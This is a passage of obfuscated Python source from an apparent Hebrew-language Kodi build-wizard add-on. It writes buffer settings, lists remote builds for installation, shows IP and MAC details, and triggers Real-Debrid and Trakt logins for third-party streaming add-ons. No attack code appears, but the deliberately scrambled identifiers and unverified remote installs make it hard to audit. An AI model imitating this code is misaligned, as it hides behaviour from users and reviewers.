		with open (O0O0OOO00O0O0OOOO ,"w")as O00O00OO0000OO0OO :#line:1671
			if OOO0OO0OO0OOO0O0O >=17 :O000O0O00O0OOO00O =xml_data_advSettings_New (str (O00O00OOO0000OOOO ))#line:1672
			else :O000O0O00O0OOO00O =xml_data_advSettings_old (str (O00O00OOO0000OOOO ))#line:1673
			O00O00OO0000OO0OO .write (O000O0O00O0OOO00O )#line:1674
			DIALOG .ok ('Buffer Size Set to: '+str (O00O00OOO0000OOOO ),'Please restart Kodi for settings to apply.','')#line:1675
def xml_data_advSettings_old (OOO00OO00O0OOOO00 ):#line:1676
	OOO00000000O00OO0 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OOO00OO00O0OOOO00 #line:1686
	return OOO00000000O00OO0 #line:1687
def xml_data_advSettings_New (OO0000OOOO00OOO0O ):#line:1689
	O0O0O0OOOO000OOOO ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%OO0000OOOO00OOO0O #line:1701
	return O0O0O0OOOO000OOOO #line:1702
def write_ADV_SETTINGS_XML (O00000OOO00OO000O ):#line:1703
    if not os .path .exists (xml_file ):#line:1704
        with open (xml_file ,"w")as O0O0000OOOOO00O0O :#line:1705
            O0O0000OOOOO00O0O .write (xml_data )#line:1706
def _O0O000OOOOOOOOOO0 (default ="",heading ="",hidden =False ):#line:1707
    ""#line:1708
    OO0O00000O00O00O0 =xbmc .Keyboard (default ,heading ,hidden )#line:1709
    OO0O00000O00O00O0 .doModal ()#line:1710
    if (OO0O00000O00O00O0 .isConfirmed ()):#line:1711
        return unicode (OO0O00000O00O00O0 .getText (),"utf-8")#line:1712
    return default #line:1713
def index ():#line:1715
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:1716
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1717
	if AUTOUPDATE =='Yes':#line:1718
		if wiz .workingURL (WIZARDFILE )==True :#line:1719
			O00000OO0OOO00OOO =wiz .checkWizard ('version')#line:1720
			if O00000OO0OOO00OOO >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,O00000OO0OOO00OOO ),'wizardupdate',themeit =THEME2 )#line:1721
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1722
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1723
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1724
	if len (BUILDNAME )>0 :#line:1725
		OO0O00O00O0OO0O00 =wiz .checkBuild (BUILDNAME ,'version')#line:1726
		O0OOOO0O0O00OO000 ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:1727
		if OO0O00O00O0OO0O00 >BUILDVERSION :O0OOOO0O0O00OO000 ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(O0OOOO0O0O00OO000 ,OO0O00O00O0OO0O00 )#line:1728
		addDir (O0OOOO0O0O00OO000 ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:1730
		try :#line:1732
		     OOO00O0O0O00O00OO =wiz .themeCount (BUILDNAME )#line:1733
		except :#line:1734
		   OOO00O0O0O00O00OO =False #line:1735
		if not OOO00O0O0O00O00OO ==False :#line:1736
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:1737
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:1738
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:1741
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:1742
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1743
	addFile ('אימות חשבון + RD','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:1747
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:1749
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:1751
def morsetup ():#line:1753
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:1754
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:1755
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:1756
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:1760
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:1761
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:1764
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:1765
	addFile ('הגדר מצב RD','rdon',icon =ICONMAINT ,themeit =THEME1 )#line:1766
	addFile ('ביטול מצב RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:1767
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:1775
	setView ('files','viewType')#line:1776
def morsetup2 ():#line:1777
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:1778
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:1779
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:1780
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:1781
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:1782
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:1783
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:1784
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:1785
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:1786
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:1787
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:1788
def fastupdate ():#line:1789
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:1790
def forcefastupdate ():#line:1792
			O000OO00O0000O000 ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:1793
			wiz .ForceFastUpDate (ADDONTITLE ,O000OO00O0000O000 )#line:1794
def rdsetup ():#line:1798
	if not xbmc .getCondVisibility ('System.HasAddon(script.module.resolveurl)'):#line:1799
		xbmc .executebuiltin ("InstallAddon(script.module.resolveurl)")#line:1800
	if not xbmc .getCondVisibility ('System.HasAddon(script.module.urlresolver)'):#line:1801
		xbmc .executebuiltin ("InstallAddon(script.module.urlresolver)")#line:1802
	addFile ('[COLOR red]ResolverUrl[/COLOR] [COLOR gold]Real-Debrid Authorization[/COLOR]','resolveurl',fanart =FANART ,icon =ICONSAVE ,themeit =THEME2 )#line:1803
	addFile ('[COLOR blue]URLResolver[/COLOR] [COLOR gold]Real-Debrid Authorization[/COLOR]','urlresolver',fanart =FANART ,icon =ICONSAVE ,themeit =THEME2 )#line:1804
	setView ('files','viewType')#line:1805
def traktsetup ():#line:1807
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1808
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1809
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1810
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1811
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1812
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1813
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1814
	setView ('files','viewType')#line:1815
def resolveurlsetup ():#line:1817
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:1818
def urlresolversetup ():#line:1819
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:1820
def placentasetup ():#line:1822
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:1823
def reptiliasetup ():#line:1824
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:1825
def flixnetsetup ():#line:1826
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:1827
def yodasetup ():#line:1828
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:1829
def numberssetup ():#line:1830
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:1831
def uranussetup ():#line:1832
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:1833
def genesissetup ():#line:1834
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:1835
def net_tools (view =None ):#line:1837
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:1838
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1839
	setView ('files','viewType')#line:1841
def speedMenu ():#line:1842
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:1843
def viewIP ():#line:1844
	O0OOOO00OO0O0OO00 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:1858
	O00O0O0000O0O0OO0 =[];O0O0O00000O00OOO0 =0 #line:1859
	for OO00OOO0OOOOO0OO0 in O0OOOO00OO0O0OO00 :#line:1860
		OOOOOOOOO0000OOO0 =wiz .getInfo (OO00OOO0OOOOO0OO0 )#line:1861
		OO00000000OOOOOO0 =0 #line:1862
		while OOOOOOOOO0000OOO0 =="Busy"and OO00000000OOOOOO0 <10 :#line:1863
			OOOOOOOOO0000OOO0 =wiz .getInfo (OO00OOO0OOOOO0OO0 );OO00000000OOOOOO0 +=1 ;wiz .log ("%s sleep %s"%(OO00OOO0OOOOO0OO0 ,str (OO00000000OOOOOO0 )));xbmc .sleep (1000 )#line:1864
		O00O0O0000O0O0OO0 .append (OOOOOOOOO0000OOO0 )#line:1865
		O0O0O00000O00OOO0 +=1 #line:1866
	O0O0OO00O0O00OOO0 ,O0OOOOO0OOOO0OO0O ,OOO00OOOOO000OOOO =getIP ()#line:1867
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0O0000O0O0OO0 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1868
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OO00O0O00OOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1869
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOOOO0OOOO0OO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1870
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00OOOOO000OOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1871
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0O0000O0O0OO0 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1872
	setView ('files','viewType')#line:1873
def buildMenu ():#line:1875
	if USERNAME =='':#line:1876
		ADDON .openSettings ()#line:1877
		sys .exit ()#line:1878
	if PASSWORD =='':#line:1879
		ADDON .openSettings ()#line:1880
	OOO000OO00OOOO0OO =u_list (SPEEDFILE )#line:1881
	(OOO000OO00OOOO0OO )#line:1882
	O0O0O000OO000O000 =(wiz .workingURL (OOO000OO00OOOO0OO ))#line:1883
	(O0O0O000OO000O000 )#line:1884
	O0O0O000OO000O000 =wiz .workingURL (SPEEDFILE )#line:1885
	if not O0O0O000OO000O000 ==True :#line:1886
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1887
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:1888
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1889
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:1890
		addFile ('%s'%O0O0O000OO000O000 ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:1891
	else :#line:1892
		OO000O00O00OO0OO0 ,O00O0O0000O0000OO ,OOOO0O000OOOOOO00 ,O000O0000O0OOOO00 ,O0OO0O0OO00OOOOO0 ,O0OO000OO000OOOOO ,O00OO0O0OO0O0O00O =wiz .buildCount ()#line:1893
		O0O000OOOOOOOOO00 =False ;O0O0000OOO00OO0O0 =[]#line:1894
		if THIRDPARTY =='true':#line:1895
			if not THIRD1NAME ==''and not THIRD1URL =='':O0O000OOOOOOOOO00 =True ;O0O0000OOO00OO0O0 .append ('1')#line:1896
			if not THIRD2NAME ==''and not THIRD2URL =='':O0O000OOOOOOOOO00 =True ;O0O0000OOO00OO0O0 .append ('2')#line:1897
			if not THIRD3NAME ==''and not THIRD3URL =='':O0O000OOOOOOOOO00 =True ;O0O0000OOO00OO0O0 .append ('3')#line:1898
		O000OO0O00000O0OO =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:1899
		OOO000O0OOO0O000O =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O000OO0O00000O0OO )#line:1900
		if OO000O00O00OO0OO0 ==1 and O0O000OOOOOOOOO00 ==False :#line:1901
			for OO00OOO0OOO00OO0O ,OOOOOOO00000OO0OO ,OOOO00OO00000OOOO ,O00OOOO00O00OOO0O ,O00O00OO00O00OOOO ,O0OOOO0OOO00O0O0O ,O0000OO0OOO0O0OO0 ,OO0000O0O00OO0O0O ,O00O0O0O0000O0OO0 ,OO000OOO00OO00O00 in OOO000O0OOO0O000O :#line:1902
				if not SHOWADULT =='true'and O00O0O0O0000O0OO0 .lower ()=='yes':continue #line:1903
				if not DEVELOPER =='true'and wiz .strTest (OO00OOO0OOO00OO0O ):continue #line:1904
				viewBuild (OOO000O0OOO0O000O [0 ][0 ])#line:1905
				return #line:1906
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:1909
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1910
		if O0O000OOOOOOOOO00 ==True :#line:1911
			for OO0O0O0OOO0OO00OO in O0O0000OOO00OO0O0 :#line:1912
				OO00OOO0OOO00OO0O =eval ('THIRD%sNAME'%OO0O0O0OOO0OO00OO )#line:1913
		if len (OOO000O0OOO0O000O )>=1 :#line:1915
			if SEPERATE =='true':#line:1916
				for OO00OOO0OOO00OO0O ,OOOOOOO00000OO0OO ,OOOO00OO00000OOOO ,O00OOOO00O00OOO0O ,O00O00OO00O00OOOO ,O0OOOO0OOO00O0O0O ,O0000OO0OOO0O0OO0 ,OO0000O0O00OO0O0O ,O00O0O0O0000O0OO0 ,OO000OOO00OO00O00 in OOO000O0OOO0O000O :#line:1917
					if not SHOWADULT =='true'and O00O0O0O0000O0OO0 .lower ()=='yes':continue #line:1918
					if not DEVELOPER =='true'and wiz .strTest (OO00OOO0OOO00OO0O ):continue #line:1919
					OO000000O0OO000O0 =createMenu ('install','',OO00OOO0OOO00OO0O )#line:1920
					addDir ('[%s] %s (v%s)'%(float (O00O00OO00O00OOOO ),OO00OOO0OOO00OO0O ,OOOOOOO00000OO0OO ),'viewbuild',OO00OOO0OOO00OO0O ,description =OO000OOO00OO00O00 ,fanart =OO0000O0O00OO0O0O ,icon =O0000OO0OOO0O0OO0 ,menu =OO000000O0OO000O0 ,themeit =THEME2 )#line:1921
			else :#line:1922
				if O000O0000O0OOOO00 >0 :#line:1923
					OOO0O00OOO0OO0OOO ='+'if SHOW17 =='false'else '-'#line:1924
					if SHOW17 =='true':#line:1926
						for OO00OOO0OOO00OO0O ,OOOOOOO00000OO0OO ,OOOO00OO00000OOOO ,O00OOOO00O00OOO0O ,O00O00OO00O00OOOO ,O0OOOO0OOO00O0O0O ,O0000OO0OOO0O0OO0 ,OO0000O0O00OO0O0O ,O00O0O0O0000O0OO0 ,OO000OOO00OO00O00 in OOO000O0OOO0O000O :#line:1928
							if not SHOWADULT =='true'and O00O0O0O0000O0OO0 .lower ()=='yes':continue #line:1929
							if not DEVELOPER =='true'and wiz .strTest (OO00OOO0OOO00OO0O ):continue #line:1930
							OO00O0OO0000O0OOO =int (float (O00O00OO00O00OOOO ))#line:1931
							if OO00O0OO0000O0OOO ==17 :#line:1932
								OO000000O0OO000O0 =createMenu ('install','',OO00OOO0OOO00OO0O )#line:1933
								addDir ('[%s] %s (v%s)'%(float (O00O00OO00O00OOOO ),OO00OOO0OOO00OO0O ,OOOOOOO00000OO0OO ),'viewbuild',OO00OOO0OOO00OO0O ,description =OO000OOO00OO00O00 ,fanart =OO0000O0O00OO0O0O ,icon =O0000OO0OOO0O0OO0 ,menu =OO000000O0OO000O0 ,themeit =THEME2 )#line:1934
				if O0OO0O0OO00OOOOO0 >0 :#line:1935
					OOO0O00OOO0OO0OOO ='+'if SHOW18 =='false'else '-'#line:1936
					if SHOW18 =='true':#line:1938
						for OO00OOO0OOO00OO0O ,OOOOOOO00000OO0OO ,OOOO00OO00000OOOO ,O00OOOO00O00OOO0O ,O00O00OO00O00OOOO ,O0OOOO0OOO00O0O0O ,O0000OO0OOO0O0OO0 ,OO0000O0O00OO0O0O ,O00O0O0O0000O0OO0 ,OO000OOO00OO00O00 in OOO000O0OOO0O000O :#line:1940
							if not SHOWADULT =='true'and O00O0O0O0000O0OO0 .lower ()=='yes':continue #line:1941
							if not DEVELOPER =='true'and wiz .strTest (OO00OOO0OOO00OO0O ):continue #line:1942
							OO00O0OO0000O0OOO =int (float (O00O00OO00O00OOOO ))#line:1943
							if OO00O0OO0000O0OOO ==18 :#line:1944
								OO000000O0OO000O0 =createMenu ('install','',OO00OOO0OOO00OO0O )#line:1945
								addDir ('[%s] %s (v%s)'%(float (O00O00OO00O00OOOO ),OO00OOO0OOO00OO0O ,OOOOOOO00000OO0OO ),'viewbuild',OO00OOO0OOO00OO0O ,description =OO000OOO00OO00O00 ,fanart =OO0000O0O00OO0O0O ,icon =O0000OO0OOO0O0OO0 ,menu =OO000000O0OO000O0 ,themeit =THEME2 )#line:1946
				if OOOO0O000OOOOOO00 >0 :#line:1947
					OOO0O00OOO0OO0OOO ='+'if SHOW16 =='false'else '-'#line:1948
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(OOO0O00OOO0OO0OOO ,OOOO0O000OOOOOO00 ),'togglesetting','show16',themeit =THEME3 )#line:1949
					if SHOW16 =='true':#line:1950
						for OO00OOO0OOO00OO0O ,OOOOOOO00000OO0OO ,OOOO00OO00000OOOO ,O00OOOO00O00OOO0O ,O00O00OO00O00OOOO ,O0OOOO0OOO00O0O0O ,O0000OO0OOO0O0OO0 ,OO0000O0O00OO0O0O ,O00O0O0O0000O0OO0 ,OO000OOO00OO00O00 in OOO000O0OOO0O000O :#line:1951
							if not SHOWADULT =='true'and O00O0O0O0000O0OO0 .lower ()=='yes':continue #line:1952
							if not DEVELOPER =='true'and wiz .strTest (OO00OOO0OOO00OO0O ):continue #line:1953
							OO00O0OO0000O0OOO =int (float (O00O00OO00O00OOOO ))#line:1954
							if OO00O0OO0000O0OOO ==16 :#line:1955
								OO000000O0OO000O0 =createMenu ('install','',OO00OOO0OOO00OO0O )#line:1956
								addDir ('[%s] %s (v%s)'%(float (O00O00OO00O00OOOO ),OO00OOO0OOO00OO0O ,OOOOOOO00000OO0OO ),'viewbuild',OO00OOO0OOO00OO0O ,description =OO000OOO00OO00O00 ,fanart =OO0000O0O00OO0O0O ,icon =O0000OO0OOO0O0OO0 ,menu =OO000000O0OO000O0 ,themeit =THEME2 )#line:1957
				if O00O0O0000O0000OO >0 :#line:1958
					OOO0O00OOO0OO0OOO ='+'if SHOW15 =='false'else '-'#line:1959
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(OOO0O00OOO0OO0OOO ,O00O0O0000O0000OO ),'togglesetting','show15',themeit =THEME3 )#line:1960
					if SHOW15 =='true':#line:1961
						for OO00OOO0OOO00OO0O ,OOOOOOO00000OO0OO ,OOOO00OO00000OOOO ,O00OOOO00O00OOO0O ,O00O00OO00O00OOOO ,O0OOOO0OOO00O0O0O ,O0000OO0OOO0O0OO0 ,OO0000O0O00OO0O0O ,O00O0O0O0000O0OO0 ,OO000OOO00OO00O00 in OOO000O0OOO0O000O :#line:1962
							if not SHOWADULT =='true'and O00O0O0O0000O0OO0 .lower ()=='yes':continue #line:1963
							if not DEVELOPER =='true'and wiz .strTest (OO00OOO0OOO00OO0O ):continue #line:1964
							OO00O0OO0000O0OOO =int (float (O00O00OO00O00OOOO ))#line:1965
							if OO00O0OO0000O0OOO <=15 :#line:1966
								OO000000O0OO000O0 =createMenu ('install','',OO00OOO0OOO00OO0O )#line:1967
								addDir ('[%s] %s (v%s)'%(float (O00O00OO00O00OOOO ),OO00OOO0OOO00OO0O ,OOOOOOO00000OO0OO ),'viewbuild',OO00OOO0OOO00OO0O ,description =OO000OOO00OO00O00 ,fanart =OO0000O0O00OO0O0O ,icon =O0000OO0OOO0O0OO0 ,menu =OO000000O0OO000O0 ,themeit =THEME2 )#line:1968
		elif O00OO0O0OO0O0O00O >0 :#line:1969
			if O0OO000OO000OOOOO >0 :#line:1970
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:1971
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:1972
			else :#line:1973
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:1974
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:1975
	setView ('files','viewType')#line:1976
def viewBuild (O0O0O00O00OOO0O00 ):#line:1978
	O0O0O00000O0000O0 =wiz .workingURL (SPEEDFILE )#line:1979
	if not O0O0O00000O0000O0 ==True :#line:1980
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:1981
		addFile ('%s'%O0O0O00000O0000O0 ,'',themeit =THEME3 )#line:1982
		return #line:1983
	if wiz .checkBuild (O0O0O00O00OOO0O00 ,'version')==False :#line:1984
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:1985
		addFile ('%s was not found in the builds list.'%O0O0O00O00OOO0O00 ,'',themeit =THEME3 )#line:1986
		return #line:1987
	O00OOOO0OO0O00OO0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:1988
	O0OOOO0OO00000OO0 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O0O0O00O00OOO0O00 ).findall (O00OOOO0OO0O00OO0 )#line:1989
	for O00000O0OOO0O0OO0 ,O00OO0O0O00OO0O00 ,O0000OO0O0OO000O0 ,O0O0OO0O00O000O00 ,O00OO0O0O0OOO00OO ,O0000000OOO0O0O00 ,OOOOO0O00OOOOO0OO ,O000OOO000OOO0OO0 ,O0000O00000O00OOO ,O00O00OO0OOO0000O in O0OOOO0OO00000OO0 :#line:1990
		O0000000OOO0O0O00 =O0000000OOO0O0O00 if wiz .workingURL (O0000000OOO0O0O00 )else ICON #line:1991
		OOOOO0O00OOOOO0OO =OOOOO0O00OOOOO0OO if wiz .workingURL (OOOOO0O00OOOOO0OO )else FANART #line:1992
		O00OOO0O0O0OOOOOO ='%s (v%s)'%(O0O0O00O00OOO0O00 ,O00000O0OOO0O0OO0 )#line:1993
		if BUILDNAME ==O0O0O00O00OOO0O00 and O00000O0OOO0O0OO0 >BUILDVERSION :#line:1994
			O00OOO0O0O0OOOOOO ='%s [COLOR red][CURRENT v%s][/COLOR]'%(O00OOO0O0O0OOOOOO ,BUILDVERSION )#line:1995
		O0000OOOO0O00O00O =int (float (KODIV ));O0O0OOOO0O0OO0000 =int (float (O0O0OO0O00O000O00 ))#line:2004
		if not O0000OOOO0O00O00O ==O0O0OOOO0O0OO0000 :#line:2005
			if O0000OOOO0O00O00O ==16 and O0O0OOOO0O0OO0000 <=15 :OO00000O0O0OO0O0O =False #line:2006
			else :OO00000O0O0OO0O0O =True #line:2007
		else :OO00000O0O0OO0O0O =False #line:2008
		addFile ('התקנה','install',O0O0O00O00OOO0O00 ,'fresh',description =O00O00OO0OOO0000O ,fanart =OOOOO0O00OOOOO0OO ,icon =O0000000OOO0O0O00 ,themeit =THEME1 )#line:2012
		if not O00OO0O0O0OOO00OO =='http://':#line:2015
			if wiz .workingURL (O00OO0O0O0OOO00OO )==True :#line:2016
				addFile (wiz .sep ('THEMES'),'',fanart =OOOOO0O00OOOOO0OO ,icon =O0000000OOO0O0O00 ,themeit =THEME3 )#line:2017
				O00OOOO0OO0O00OO0 =wiz .openURL (O00OO0O0O0OOO00OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2018
				O0OOOO0OO00000OO0 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00OOOO0OO0O00OO0 )#line:2019
				for OO000000O0000O00O ,O0000O00OOOOO00O0 ,O0O0O000000OOO00O ,OOOOOOO00O0O0OO0O ,O000OO00OOO000O0O ,O00O00OO0OOO0000O in O0OOOO0OO00000OO0 :#line:2020
					if not SHOWADULT =='true'and O000OO00OOO000O0O .lower ()=='yes':continue #line:2021
					O0O0O000000OOO00O =O0O0O000000OOO00O if O0O0O000000OOO00O =='http://'else O0000000OOO0O0O00 #line:2022
					OOOOOOO00O0O0OO0O =OOOOOOO00O0O0OO0O if OOOOOOO00O0O0OO0O =='http://'else OOOOO0O00OOOOO0OO #line:2023
					addFile (OO000000O0000O00O if not OO000000O0000O00O ==BUILDTHEME else "[B]%s (Installed)[/B]"%OO000000O0000O00O ,'theme',O0O0O00O00OOO0O00 ,OO000000O0000O00O ,description =O00O00OO0OOO0000O ,fanart =OOOOOOO00O0O0OO0O ,icon =O0O0O000000OOO00O ,themeit =THEME3 )#line:2024
	setView ('files','viewType')#line:2025
def viewThirdList (OO00O000O0O0O00OO ):#line:2027
	O0O0O0O0O00OOOOO0 =eval ('THIRD%sNAME'%OO00O000O0O0O00OO )#line:2028
	OOO00O00OOO00OOOO =eval ('THIRD%sURL'%OO00O000O0O0O00OO )#line:2029
	O00OOO0OO00O00OO0 =wiz .workingURL (OOO00O00OOO00OOOO )#line:2030
	if not O00OOO0OO00O00OO0 ==True :#line:2031
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2032
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2033
	else :#line:2034
		OO00OO0OOO00OOO00 ,O0000OO0OOO0OO0O0 =wiz .thirdParty (OOO00O00OOO00OOOO )#line:2035
